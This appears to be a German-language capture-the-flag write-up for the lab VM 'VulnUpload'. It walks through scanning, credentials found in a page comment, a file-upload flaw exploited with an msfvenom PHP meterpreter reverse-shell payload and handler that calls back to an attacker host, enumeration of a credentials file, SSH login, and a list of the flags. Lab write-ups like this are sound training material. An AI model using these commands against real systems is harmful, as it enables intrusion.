@@ -1,0 +1,117 @@
+VulnUpload WriteUp
+
+Recon:
+	arp-scan 192.168.56.0/24
+	-> 192.168.56.101
+
+	nmap -sV 192.168.56.101
+	-> 22 | ssh
+	   80 | http
+
+Website:
+	Login Form, Username Password
+	login.php, css/style.css, check_login.php (nur html), js/index.js nur für Darstellung
+	nikto -h 192.168.56.101 -p 80  (todo: nikto upgrade/update)
+	-> /robots.txt found
+		robots.txt:
+			User-agent: *
+			Disallow: /
+			Disallow: /backup
+			Disallow: /admin
+			Disallow: /admin_area
+			Disallow: /r00t
+			Disallow: /uploads
+			Disallow: /uploaded_files
+			Disallow: /flag
+	-> /admin_area/ returned 200
+		The admin area not work :)
+		Kommentar in der Page Source: username: admin, password: 3v1l_H@ck3r, flag
+	-> /uploaded_files/ returned 200
+		leer, keine Source... base64 Trick?
+	-> /flag/ returned 200
+
+Website eingeloggt als admin:
+	File Upload Center
+		Dateien können hochgeladen werden, wahrscheinlich reverse_tcp_shell
+		Einschränkungen:
+			Dateigrösse: 2 MB
+			Anzahl Dateien: 5
+			file.type = image
+		erste Versuche wurden alle hochgeladen, auch wenn sie die Einschränkungen nicht erfüllten
+		shell funktionierte aber nicht
+
+SSH:
+	gleiche Anmeldedaten wie auf der Website: Fehlgeschlagen
+
+------------------------------------------------------------------  1h 20min
+
+Website eingeloggt als admin:
+	File Upload Center
+		TCP Reverse Shell muss vom Server ausgeführt werden! -> php_reverse_shell
+		msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.56.102 LPORT=1337 -f raw > vulnupload/shelled.php
+		shelled.php ist die Payload, hochladen -> 192.168.56.101/uploaded_files/shelled.php
+		Reverse Handler:
+			$ msfconsole
+			> use exploit/multi/handler
+			> set payload php/meterpreter/reverse_tcp
+			> set LHOST 192.168.56.102
+			> set LPORT 1337
+			> exploit
+		TCP Handler reagiert auf Anfrage
+
+Shell:	
+	shell
+	/bin/sh -i
+	$ pwd -> /var/www/html/uploaded_files
+	$ id -> www-data
+	$ cd .. 
+	$ ls -> flag (directory mit erster Flag), flag.txt (permission denied, technawi), hint.txt
+	$ cat hint.txt -> 
+		try to find user technawi password to read the flag.txt file, you can find it in a hidden file ;)
+		The 3rd flag is : {7645110034526579012345670}
+	
+	Enumeration:
+		alle Files des Users technawi finden, "Permission denied" nicht anzeigen, stderr auf stdout umleiten für Errors
+		$ find / -user technawi -type f 2>&1 | grep -v "Permission"  ->
+			find: '/proc/1394/task/1394/fdinfo/6': No such file or directory
+			find: '/proc/1394/fdinfo/5': No such file or directory
+			/etc/mysql/conf.d/credentials.txt
+			/var/www/html/flag.txt
+			/home/technawi/.bash_history
+			/home/technawi/.sudo_as_admin_successful
+			/home/technawi/.profile
+			/home/technawi/.bashrc
+			/home/technawi/.bash_logout
+		$ cat /etc/mysql/conf.d/credentials.txt ->
+			The 4th flag is : {7845658974123568974185412}
+
+			username : technawi
+			password : 3vilH@ksor
+
+SSH:
+	ssh technawi@192.168.56.101
+	password: 3vilH@ksor
+	$ cd /var/www/html; ls -lsa
+	technawi kann flag.txt anschauen
+	$ cat flag.txt ->
+		The 5th flag is : {5473215946785213456975249}
+
+		Good job :)
+
+		You find 5 flags and got their points and finish the first scenario....
+
+------------------------------------------------------------------  2h 40min
+
+	
+
+FLAGS:
+	192.168.56.101/flag : The 1st flag is : {8734509128730458630012095}
+	192.168.56.101/admin_area/: The 2nd flag is : {7412574125871236547895214}
+	/var/www/html/hint.txt: The 3rd flag is : {7645110034526579012345670}
+	/etc/mysql/conf.d/credentials.txt: The 4th flag is : {7845658974123568974185412}
+	/var/www/html/flag.txt: The 5th flag is : {5473215946785213456975249}
+	
+
+
+
+	
